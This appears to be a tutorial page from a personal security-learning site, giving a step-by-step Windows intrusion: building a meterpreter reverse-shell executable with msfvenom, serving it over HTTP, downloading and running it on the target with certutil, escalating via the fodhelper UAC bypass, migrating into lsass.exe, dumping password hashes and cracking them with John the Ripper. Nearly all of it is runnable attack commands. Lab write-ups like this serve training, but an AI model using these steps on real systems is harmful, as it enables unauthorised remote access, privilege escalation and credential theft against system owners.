---
description: Explore and Learn
icon: windows
layout:
  width: wide
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: false
  pagination:
    visible: true
  metadata:
    visible: false
  tags:
    visible: true
---

# Windows Hacking and UAC Bypass





<figure><img src="../.gitbook/assets/Windows Hacking Attack Senario.png" alt=""><figcaption></figcaption></figure>

> Run the following command on the target system to enable Network sharing:
>
> ```powershell
> netsh advfirewall firewall set rule name="File and Printer Sharing (Echo Request - ICMPv4-In)" new enable=yes
> ```

First, we want to create a Reverse shell payload on attacker machine by using <mark style="color:$info;">`msfvenom`</mark>.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=4444 -f exe -o exploit.exe
```

> Note:&#x20;
>
> LHOST (Local Host): Attacker IP.
>
> LPORT (Local Port): Attacker listening port.

After creating the payload, Next we configure and start the listener by using Metasploit Frameware:

```bash
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.0.107
set LPORT 4444
exploit
```

Now, our payload and reverse shell listener was successfully created and started. Next we need to transfer the malicious payload file in target system.

To transfer the file we start the python server on our attacker machine on the same directory where we create the malicious payload file:

```bash
python3 -m http.server 8080
```

Now, we open the target windows system and download and run the file from the target windows system.

We have two method to download the file on the system:

#### **Method-1:** By using Web Browser:

We open the any web browser on the windows system --> search <mark style="color:$info;">`http://192.168.0.107:8080`</mark> and we see all file listed on the page.

Method-2: By using command line tool <mark style="color:$info;">`certutil`</mark>:

To download the we open the cmd and run the following command:

```cmd
certutil -urlcache -f http://192.168.0.107:8080/exploit.exe run.exe
```

After successfully download the file run the file:

```cmd
run.exe
```

Now, Go back to the Attacker machine, where we start the metasploit multi handler listeber, and we see we successfully got meterpreter shell.

Run the following command to confirm the target system or get tergat system info:

```bash
getuid         ##→ Displays the username context of the current Meterpreter/session user.

getsystem     ##→ Attempts to elevate privileges to SYSTEM on the target Windows machine.

sysinfo         ##→ Shows target system information such as OS, architecture, and computer name.

help         ##→ Displays available Meterpreter commands and usage information.
```

In the meterpreter shell we can perform various tasks like creating files & directory,  Deleting file remotely.

## UAC Bypass

Now to try to  bypass UAC (User Account Control) and gain higher account privilege like administrator.

So, to do this run the following commands on the meterpreter session:

```bash
bg ##→ Sends the current Meterpreter session to the background while keeping it active.

search bypassuac ##→ Searches Metasploit modules related to UAC bypass techniques.

use exploit/windows/local/bypassuac_fodhelper ##→ Selects the Fodhelper UAC bypass local exploit module for use.

set session 1 ##→ Assigns session ID 1 as the target session for the exploit.

exploit ##→ Executes the selected module against the configured target session.

```

Hence you can see another meterpreter **session 2** opened which means we successfully exploited the target once again now let’s check user privilege.

```bash
getsystem
```

if the result is <mark style="color:$info;">`NT AUTHORITY\SYSTEM`</mark> We got admin privilege successfully.

### Migrating the session with system process for persistence

Now run the <mark style="color:$info;">`ps`</mark> command to list all running processes.

Here, we use <mark style="color:$info;">`lsass.exe`</mark> process to migrate the process PID is 460.

Run the command to migrate:

```bash
migrtae 460
getuid
getpid
```

### Crack the Password using john

Dump all the hash by running <mark style="color:$info;">`hashdump`</mark> command on the meterpreter shell:

```bash
hashdump
```

copy the hash and open another terminal. create a new file called hash.txt and store the hash value on it.

```bash
echo "HASH" > hash.txt
cat hash.txt
```

Now Run John The Ripper to crack the hash:

```bash
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

> Note: Unzip the rockyou.txt.gz file&#x20;
>
> ```
> gzip -d rockyou.txt.gz
> ```
